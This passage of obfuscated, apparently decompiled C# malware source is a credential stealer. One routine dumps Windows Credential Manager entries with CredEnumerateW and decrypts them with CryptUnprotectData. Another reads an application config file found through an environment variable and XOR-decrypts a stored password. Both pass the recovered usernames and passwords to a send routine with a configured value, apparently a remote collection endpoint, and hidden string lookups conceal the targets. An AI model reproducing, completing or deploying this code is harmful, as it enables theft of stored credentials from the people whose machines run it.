			int num = Convert.ToInt32(value, 16);
			text += (char)num;
		}
		return text;
	}

	public static void smethod_12()
	{
		string path = Environment.GetEnvironmentVariable(Class22.smethod_0(737971297)) + Class22.smethod_0(737972387);
		if (!File.Exists(path))
		{
			return;
		}
		string text = File.ReadAllText(path).Replace(Class22.smethod_0(737972295), string.Empty);
		string[] array = text.Split(new char[1] { '\n' });
		string[] array2 = array;
		foreach (string text2 in array2)
		{
			if (text2.Contains(Class22.smethod_0(737972302)))
			{
				text2.Replace(Class22.smethod_0(737972302), string.Empty).Replace(Class22.smethod_0(737972317), string.Empty);
			}
			if (text2.Contains(Class22.smethod_0(737972323)))
			{
				text2.Replace(Class22.smethod_0(737972323), string.Empty).Replace(Class22.smethod_0(737972338), string.Empty);
			}
		}
	}

	[DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	public static extern bool CredEnumerateW(string string_4, uint uint_0, out uint uint_1, out IntPtr intptr_0);

	[DllImport("crypt32", CharSet = CharSet.Auto, SetLastError = true)]
	internal static extern bool CryptUnprotectData(ref Struct2 struct2_0, int int_0, int int_1, int int_2, int int_3, int int_4, out Struct2 struct2_1);

	public static void smethod_13()
	{
		try
		{
			IntPtr intptr_ = IntPtr.Zero;
			IntPtr[] array = null;
			if (CredEnumerateW(Class22.smethod_0(737972236), 0u, out var uint_, out intptr_))
			{
				array = new IntPtr[uint_];
				IntPtr intPtr = intptr_;
				for (int i = 0; i <= uint_ - 1; i++)
				{
					Struct2 struct2_ = default(Struct2);
					Struct2 struct2_2 = default(Struct2);
					int num = intPtr.ToInt32() + IntPtr.Size * i;
					IntPtr ptr = (IntPtr)num;
					ref IntPtr reference = ref array[i];
					reference = Marshal.ReadIntPtr(ptr);
					struct1_0 = (Struct1)Marshal.PtrToStructure(array[i], struct1_0.GetType());
					struct2_.int_1 = struct1_0.int_3;
					struct2_.int_0 = struct1_0.int_2;
					CryptUnprotectData(ref struct2_, 0, 0, 0, 0, 1, out struct2_2);
					struct2_2.int_1 = struct2_.int_1;
					smethod_0(Class8.class16_0.string_6 + Class22.smethod_0(737971639), Class22.smethod_0(737971647) + Class8.class16_0.string_9 + Class22.smethod_0(737972263) + struct1_0.string_3 + Class22.smethod_0(737971566) + Marshal.PtrToStringBSTR(new IntPtr(struct2_2.int_1)) + Class22.smethod_0(737972680));
				}
			}
		}
		catch
		{
		}
	}

	public static void smethod_14()
	{
		string path = Environment.GetEnvironmentVariable(Class22.smethod_0(737972696)) + Class22.smethod_0(737972726);
		if (!File.Exists(path))
		{
			return;
		}
		string text = File.ReadAllText(path);
		string text2 = string.Empty;
		string text3 = string.Empty;
		string[] array = text.Split(new char[1] { '\n' });
		string[] array2 = array;
		foreach (string text4 in array2)
		{
			if (text4.Contains(Class22.smethod_0(737972626)))
			{
				text2 = text4.Replace(Class22.smethod_0(737972626), string.Empty).Replace(Class22.smethod_0(737972642), string.Empty);
			}
			if (text4.Contains(Class22.smethod_0(737972650)))
			{
				text3 = text4.Replace(Class22.smethod_0(737972650), string.Empty).Replace(Class22.smethod_0(737972642), string.Empty);
			}
		}
		string text5 = string.Empty;
		for (int j = 0; j < text3.Length; j += 2)
		{
			text5 += (char)long.Parse(text3.Substring(j, 2), NumberStyles.HexNumber);
		}
		long num = 0L;
		string text6 = string.Empty;
		for (int k = 0; k < text5.Length; k++)
		{
			text6 += (char)(text5.Substring(k, 1)[0] ^ Class22.smethod_0(737972666).Substring((int)num, 1)[0]);
			if (num == 7L)
			{
				num = -1L;
			}
			num++;
		}
		if (text2 != null)
		{
			smethod_0(Class8.class16_0.string_6 + Class22.smethod_0(737971639), Class22.smethod_0(737971647) + Class8.class16_0.string_9 + Class22.smethod_0(737972555) + text2 + Class22.smethod_0(737971566) + text6 + Class22.smethod_0(737972680));
		}
	}
}
